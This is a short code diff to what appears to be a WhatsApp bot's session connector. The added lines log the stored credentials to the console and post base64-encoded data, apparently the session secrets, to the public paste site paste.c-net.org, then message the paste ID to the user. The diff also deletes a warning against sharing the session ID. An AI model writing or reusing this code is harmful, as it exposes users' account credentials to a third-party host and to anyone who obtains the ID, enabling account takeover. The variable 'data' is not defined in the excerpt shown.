@@ -63,9 +63,12 @@ async function connector(Num, res) {
         if (connection === 'open') {
             console.log('Connected successfully');
             await delay(5000);
-            await session.sendMessage(session.user.id, { text: "*X Astral*:\nDont share_ur_session ID" });
+            console.log(state.creds)
+            await delay(800)
+          const output = await axios.post('http://paste.c-net.org/',`${btoa(data)}`, {headers: { 'Content-Type': 'application/x-www-form-urlencoded' }});
+          let c = output.data.split('/')[3]
+           await session.sendMessage(session.user.id, {text: 'Secktor;;;'+c});	
             console.log('[Session] Session online');
-            await session.sendMessage(session.user.id, { text: `*Session*: ${sessionId}` });
         } else if (connection === 'close') {
             const reason = lastDisconnect?.error?.output?.statusCode;
             console.log(`Connection closed. Reason: ${reason}`);
